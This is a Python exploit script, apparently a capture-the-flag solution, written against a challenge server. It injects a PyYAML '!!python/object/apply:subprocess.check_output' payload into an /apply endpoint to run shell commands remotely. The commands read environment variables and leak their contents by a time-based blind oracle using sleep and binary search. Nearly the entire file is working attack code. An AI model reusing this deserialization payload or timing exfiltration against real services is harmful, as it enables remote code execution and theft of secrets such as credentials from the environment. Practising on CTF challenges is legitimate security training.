import httpx, asyncio, time
B='https://vua27nsgx2jztner.t.ctf.tg'
# payload YAML qui sleep SLEEP si cond vraie. cond porte sur la variable d'env contenant le flag.
SLEEP=3; THRESH=3.6
def payload(cmd):
    # échappe pour YAML flow + JSON list ; on passe le cmd sh entre guillemets
    inner=cmd.replace('\\','\\\\').replace('"','\\"')
    return '!!python/object/apply:subprocess.check_output [["sh","-c","%s"]]'%inner
def getv():  # expr sh donnant la valeur du flag
    return 'V=$(env | grep -iE "flag|nctf" | sed -E "s/^[^=]*=//" | head -c 200)'
client=None
async def cond_true(cond_sh):
    cmd='%s; if %s; then sleep %d; fi'%(getv(),cond_sh,SLEEP)
    t=time.time()
    try:
        r=await client.post('/apply',data={'config':payload(cmd)})
    except Exception: return await cond_true(cond_sh)
    return (time.time()-t)>THRESH
async def main():
    global client
    async with httpx.AsyncClient(base_url=B,http2=True,verify=False,timeout=30) as cl:
        global client; client=cl
        # longueur
        lo,hi=0,80
        while lo<hi:
            mid=(lo+hi+1)//2
            if await cond_true('[ ${#V} -ge %d ]'%mid): lo=mid
            else: hi=mid-1
        L=lo; print('longueur',L,flush=True)
        flag=['?']*L
        async def getchar(p):
            a,b=32,126
            while a<b:
                m=(a+b)//2
                # char à la position p (1-indexé) > caractère ascii m ?
                cond='[ "$(printf %%s "$V" | cut -c %d)" \\> "$(printf "\\\\$(printf %%03o %d)")" ]'%(p,m)
                if await cond_true(cond): a=m+1
                else: b=m
            flag[p-1]=chr(a); print(''.join(flag),flush=True)
        # positions en parallèle (concurrence limitée)
        sem=asyncio.Semaphore(1)
        async def worker(p):
            async with sem: await getchar(p)
        await asyncio.gather(*(worker(p) for p in range(1,L+1)))
        print('FLAG:', ''.join(flag),flush=True)
asyncio.run(main())
